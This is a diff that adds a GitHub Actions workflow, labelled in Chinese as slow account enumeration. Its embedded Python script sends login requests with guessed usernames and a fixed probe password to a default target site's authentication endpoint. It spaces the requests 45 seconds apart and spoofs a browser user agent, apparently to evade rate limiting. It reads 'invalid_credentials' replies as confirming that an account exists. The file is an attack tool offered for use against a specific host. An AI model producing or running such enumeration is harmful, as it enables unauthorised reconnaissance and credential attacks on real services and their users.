@@ -1,0 +1,50 @@
+name: 慢速账号枚举
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: '目标基础URL'
+        required: true
+        default: 'https://nlhlsd.xyz'
+      accounts:
+        description: '账号列表(逗号分隔)'
+        required: true
+        default: 'admin,root,maozi,zzz_nobody_99,administrator,test,guest'
+      interval:
+        description: '请求间隔秒'
+        required: false
+        default: '45'
+jobs:
+  enum:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          python3 - <<'PYEOF'
+          import urllib.request, urllib.error, json, time, os
+          target = os.environ['INPUT_TARGET'].rstrip('/')
+          accounts = [a.strip() for a in os.environ['INPUT_ACCOUNTS'].split(',')]
+          interval = int(os.environ['INPUT_INTERVAL'])
+          print(f"慢速枚举: {len(accounts)} 账号, 间隔 {interval}s", flush=True)
+          for i, acc in enumerate(accounts):
+            body = json.dumps({"account": acc, "password": "ProbePass#2026Xy"}).encode()
+            req = urllib.request.Request(target + "/api/auth/login", data=body, method="POST",
+                    headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 Chrome/126.0"})
+            try:
+              resp = urllib.request.urlopen(req, timeout=15)
+              d = resp.read().decode()
+              print(f"  [{i+1}] {acc} -> HTTP{resp.status} {d[:150]}", flush=True)
+            except urllib.error.HTTPError as e:
+              d = e.read().decode()
+              # invalid_credentials = 账号存在; 其他 = 视情况
+              tag = "账号存在!" if "invalid_credentials" in d else ("限流" if e.code==429 else "其他")
+              print(f"  [{i+1}] {acc} -> HTTP{e.code} [{tag}] {d[:100]}", flush=True)
+            except Exception as e:
+              print(f"  [{i+1}] {acc} -> ERR {str(e)[:80]}", flush=True)
+            if i < len(accounts)-1:
+              time.sleep(interval)
+          print("枚举完成", flush=True)
+          PYEOF
+        env:
+          INPUT_TARGET: ${{ github.event.inputs.target }}
+          INPUT_ACCOUNTS: ${{ github.event.inputs.accounts }}
+          INPUT_INTERVAL: ${{ github.event.inputs.interval }}
